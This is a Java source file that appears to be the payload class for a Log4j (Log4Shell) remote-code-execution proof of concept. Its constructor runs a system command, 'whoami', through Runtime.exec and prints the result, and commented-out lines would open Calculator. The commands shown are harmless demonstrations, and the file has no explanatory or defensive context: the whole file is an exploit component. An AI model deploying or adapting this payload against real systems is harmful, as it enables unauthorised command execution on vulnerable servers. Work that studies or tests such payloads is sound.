import java.io.BufferedReader;
import java.io.InputStream;
import  java.io.InputStreamReader;
public class Log4jRCE {
    public Log4jRCE(){
        Process p;
        String cmd="whoami";
        try{
            //String[] commands = {"open","/System/Applications/Calculator.app"};
            //String commands = ("open /System/Applications/Calculator.app");
            p = Runtime.getRuntime().exec(cmd);
            InputStream fis=p.getInputStream();
            InputStreamReader isr=new InputStreamReader(fis);
            BufferedReader br=new BufferedReader(isr);
            String line=null;
            while((line=br.readLine())!=null)
            {
                System.out.println(line);
            }
        } catch(Exception e){
            e.printStackTrace();
        }
    }

    public static void main(String[] argv) {
        Log4jRCE e = new Log4jRCE();
    }
}